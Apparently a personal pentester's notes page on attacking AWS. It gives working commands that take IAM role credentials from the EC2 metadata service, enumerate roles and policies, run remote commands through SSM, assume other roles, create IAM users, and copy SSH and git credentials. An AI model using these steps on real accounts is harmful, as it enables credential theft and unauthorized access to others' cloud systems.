---
tags: a/topic
---
in:: [[hacking]]
```breadcrumbs
type: tree
dir: down
depth: -1
from: -"_templates"
```
# Notes
AWS hacking notes

## Stealing AWS token from metadata service
```
curl  http://169.254.169.254/latest/meta-data/iam/security-credentials/
```
* Copy the role name returned
```
curl  http://169.254.169.254/latest/meta-data/iam/security-credentials/<role_name>
```

or
```
export ROLE_NAME=`curl -s http://169.254.169.254/latest/meta-data/iam/security-credentials/`
echo "Instance role is ${ROLE_NAME}"
curl -s http://169.254.169.254/latest/meta-data/iam/security-credentials/${ROLE_NAME}/
```

### aws cli
```
aws sts get-session-token
```
won’t work if you’re already using session creds

## Finding out who you are
Pull the instance profile from metadata
```
curl  http://169.254.169.254/latest/meta-data/iam/info/
```
* Copy the InstanceProfileArn field from the result

Pull the role name from metadata
```
curl  http://169.254.169.254/latest/meta-data/iam/security-credentials/
```

AWS command line
```
aws sts get-caller-identity
```

## Finding out what you have access to
Get Role. Shows trust relationships.
```
aws iam get-role --role-name ${ROLE}
```

List managed policies attached to role
```
aws iam list-attached-role-policies --role-name $ROLE
```

Get Inline Role Names
```
aws iam list-role-policies --role-name $ROLE
```

Iterate over all inline policies
```
for POLICYNAME in `aws iam list-role-policies --role-name $ROLE | jq -r '.PolicyNames[]'`; do aws iam get-role-policy --role-name $ROLE --policy-name $POLICYNAME; done
```
Retrieves the specified inline policy document that is embedded with the specified IAM role.
```
aws iam get-role-policy --role-name <value>
```
aws iam get-instance-profile —instance-profile-name <instance_profile_name>     (gets roles and policies that this instance profile has)

---
Escalation (using assume role)


Pulling interesting metadata
curl  http://169.254.169.254/latest/meta-data/
curl  http://169.254.169.254/latest/user-data
curl  http://169.254.169.254/latest/dynamic/
curl  http://169.254.169.254/latest/meta-data/iam/info/
curl  http://169.254.169.254/latest/meta-data/iam/security-credentials/<instance_profile_name>

Running aws-configure
mkdir ~/.aws
cat <<EOF >~.awsconfig
[default]
output = json
region = us-east-1
EOF



Aws CLI fun
aws iam get-instance-profile —instance-profile-name <instance_profile_name>
aws iam get-role —role-name jslave
aws iam list-account-aliases
aws ec2 describe-security-groups —group-names ‘Default’ —query ‘SecurityGroups[0].OwnerId’ —output text               (cheat for getting current account id)
aws iam list-roles
aws iam list-attached-role-policies —role-name <role_name>
aws iam list-role-policies —-role-name <role_name>
aws iam get-role-policy —-role-name <role_name> —policy-name <policy_name>


Aws CLI get current user (one of these may work)
aws iam get-user
aws sts get-caller-identity

AWS SSM Run commands
aws ssm send-command --instance-ids "i-0ddd4588e3ab7bd99" --document-name "AWS-RunShellScript" --comment "IP config" --parameters commands=ifconfig --output text


Getting account info

Get-caller-identity gives the account number. List-account-aliases gives alias.
aws sts get-caller-identity
aws iam list-account-aliases

Sign in URL
https://Your_AWS_Account_ID.signin.aws.amazon.com/console/
https://Your_Alias.signin.aws.amazon.com/console/


AWS S3 CLI

aws s3 ls
aws s3 ls s3://bucket/dir/
aws s3 cp s3://bucket/dir/file .

AWS codecommit
aws codecommit list-repositories —region us-east-1

Things to work on
$ aws sts get-session-token
—

Testing git access

cat ~/.gitconfig
find / | grep ‘.git/config’        (finding any local git repos)
cat ….git/config               (finding where the git repos are hosted)
git config —list

* there does not seem to be a way to get a list of all repos. bitbucket has an api that will list them if you have a username/password (and not just an ssh key)

Stealing git access

* copy ~gitconfig and all the files in ~.ssh

SSRF notes

https://github.com/swisskyrepo/PayloadsAllTheThings/tree/master/Server%20Side%20Request%20Forgery

# Assume Role
If a given role can assume other roles, this is how to switch
aws sts assume-role --role-arn "arn:aws:iam::123456789012:role/example-role" --role-session-name AWSCLI-Session

# Burp AWS Scopes
^.*\.amazonaws\.com$
^.*\.cloudfront\.net$

## Config file format
```
{
    "enabled":true,
    "host":"^.*\\.amazonaws\\.com$",
    "protocol":"any"
},
{
    "enabled":true,
    "host":"^.*\\.cloudfront\\.net$",
    "protocol":"any"
}
```

# Cloudformation
## Creating user via cloudformation
```
aws cloudformation create-stack --stack-name myuser --template-body file://user.yaml --capabilities CAPABILITY_NAMED_IAM
```

# References
* [AWS - Pentest Book](https://pentestbook.six2dez.com/enumeration/cloud/aws)
* [GitHub - RhinoSecurityLabs/pacu: The AWS exploitation framework, designed for testing the security of Amazon Web Services environments.](https://github.com/RhinoSecurityLabs/pacu)
